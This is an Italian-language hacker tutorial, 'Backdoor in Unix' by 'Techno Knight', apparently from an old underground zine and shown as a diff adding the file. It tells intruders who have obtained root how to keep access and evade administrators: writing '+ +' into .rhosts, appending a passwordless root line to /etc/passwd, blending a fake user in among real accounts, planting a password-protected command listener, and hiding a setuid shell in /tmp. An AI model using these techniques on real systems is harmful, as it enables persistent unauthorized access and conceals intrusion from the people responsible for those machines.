@@ -1,0 +1,69 @@
+                    ****************** 
+                   * BACKDOOR IN UNIX *
+                    ******************
+
+                      Techno Knight
+
+                                
+Questo e' un argomento molto trattato, semplicemente perche' e'
+assai utile sapere come mettere backdoor, immaginate, voi avete
+lavorato per ore per entrare su un sistema ed ottenere il root,
+e poi il sysadm se ne accorge e in pochi secondi perdete  il
+lavoro di ore....(a me e' capitato, e vi dico che non e' per niente una
+bella cosa :)
+Beh, non possiamo certo essere sicuri al 100% di poterci tornare, pero'
+se riusciamo a fare una bd abbastanza nascosta e' probabile che il root
+non ce la sgama.
+Ecco le bd + comuni :
+
+1) .rhosts
+   
+Questo file contiene una lista hostname/username che possono accedere
+tramite rlogin. Anziche' inserire il nostro hostname e' molto meglio
+inserire due + : "+ +", cioe' chiunque puo' accedere tramite rlogin.
+Es.
+
+Se ad esempio abbiamo accesso in scrittura nella directory /home/pippo
+dell'utente pippo, al file .rhosts, e ci mettiamo dentro "+ +" poi,
+se ci troviamo fuori dal sistema, possiamo rientrare come utente pippo
+scrivendo dal nostro sistema :
+                
+                rlogin -l pippo servervittima.com
+                                                  
+
+2) Nuovo account
+
+Aggiungere un account a /etc/passwd e' la backdoor + scema, e anche la +
+sgamabile : "echo techno::0:0::/:/bin/sh >> /etc/passwd"
+Cosç ci si crea un account con privilegi da root, senza password (oppure
+possiamo usare adduser, o farci un programmino che ci cripti una password)
+pero' il root ci sgamera' subito. Ma c'e' un'alternativa : se il sistema e'
+abbastanza affollato di user si puo' inserire in mezzo al file di password
+un account con privilegi minori, che anche se quando lo useremo non ci
+dara' il root, ci dara' pur sempre la possibilita' di rientrare nel sistema,
+e un attacco da dentro e' sempre + semplice. Ovviamente dovremmo scegliere
+un username adeguato agli altri, e anche nel campo delle info (il 5¯ campo)
+se gli altri ce l'hanno riempito allora anche noi dovremmo riempirlo, ad
+esempio con il nome e il cognome. Se il server e' italiano potete inventarlo
+se invece e' straniero prendete il nome di un utente a caso, e il cognome
+di un altro.
+
+3) Server
+
+Potete farvi un applicazione server da mettere sul sistema, che ascolti
+su una porta e che quando qualcuno ci si collega puo' dargli dei comandi
+che lui eseguira' sul server. Se vogliamo evitare che qualcuno lo scopra
+per caso e approfitti del nostro lavoro possiamo fare che serva una pass.
+Un programmino del genere e' molto facile da fare, quindi vi conviene
+usare anche una backdoor del genere.
+
+4) Suid Shell
+
+Una suid shell vi serve se perdete il root, e riuscite a tornare sul
+server con privilegi minori. Per farla, quando siete root, copiate
+una shell in un posto nascosto (es. "/tmp/.       ") e poi settatela
+come suid cosi' : "chmod 4777 lashell"
+
+
+                Techno Knight (techno83@freemail.it)ı
+                                                
